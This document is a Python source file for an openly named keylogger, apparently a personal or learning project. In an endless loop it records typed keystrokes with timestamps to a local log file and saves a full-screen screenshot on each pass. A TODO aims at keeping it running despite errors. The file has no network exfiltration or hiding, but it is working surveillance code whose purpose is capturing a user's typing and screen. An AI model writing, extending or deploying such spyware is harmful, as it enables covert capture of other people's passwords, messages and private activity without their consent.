import os
from datetime import datetime
from key_listener import KeyListener
import sys
from PIL import ImageGrab

# TODO threading para soportar capturas de pantalla cada x tiempo y captura de teclado cada y
# TODO error handling with the primary goal of not stopping the program

# --------------------- CONSTANTS --------------------- #

LOGS_DIR = 'keylogger/logs/'
LOG_FILE = 'log.txt'  

IMG_DIR = 'keylogger/imgs/'
IMG_FILE = 'screenshot_'

# --------------------- FUNCTIONS --------------------- #

def write_to_log(message: str, log_name: str) -> bool:
    """
    Writes a message to a log file.

    Args:
        message: The message to be written to the log file.
        log_name: The name of the log file.

    Returns:
        True if the message was successfully written to the log file, False otherwise.
    """
    try:
        log_path = os.path.join(LOGS_DIR, log_name)

        if not os.path.exists(LOGS_DIR):
            os.makedirs(LOGS_DIR)
            print("Directory {} created successfully!".format(LOGS_DIR))

        if not os.path.exists(log_path):
            with open(log_path, 'w') as f:
                f.write('---- KEYLOGGER LOG ----\n')

        with open(log_path, 'a') as f:
            f.write(message)
        
        return True
    except Exception as e:
        print(e)
        return False
    
def format_message(content: str) -> str:
    """
    Format a message with the current date and a separator.

    Args:
        content (str): The content of the message.

    Returns:
        str: The formatted message with the current date and separator.
    """
    date = 'DATE: {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
    sep = '\n# ---------------------------------------------- #\n'

    return '{date}{sep}{content}{sep}\n'.format(date=date, content=content, sep=sep)

def handle_keyboard_interrupt(key_listener):
    """
    Handle a keyboard interrupt event.

    Parameters:
        key_listener (Key_Listener): The key listener object that captures the typed keys.

    Returns:
        None
    """
    typed_keys = key_listener.get_keys()
    message = format_message(typed_keys)
    write_to_log(message, LOG_FILE)
    try:
        sys.exit(130)
    except SystemExit:
        os._exit(130)

def take_screenshot():
    try:
        if not os.path.exists(IMG_DIR):
            os.makedirs(IMG_DIR)
            print("Directory {} created successfully!".format(IMG_DIR))

        image_number = 1
        while os.path.isfile('{}{}'.format(IMG_DIR, IMG_FILE + str(image_number) + '.png')):
            image_number += 1

        im = ImageGrab.grab()
        image_name = '{}{}'.format(IMG_DIR, IMG_FILE + str(image_number) + '.png')
        im.save(image_name, 'png') 

        return True
    except Exception as e:
        print(e)
        return False

# --------------------- MAIN --------------------- #

def main():
    key_listener = KeyListener()
    try:
        while True:
            typed_keys = key_listener.read_keys()
            message = format_message(typed_keys)
            take_screenshot()
            write_to_log(message, LOG_FILE)
    except KeyboardInterrupt:
        handle_keyboard_interrupt(key_listener)

if __name__ == "__main__":
    main()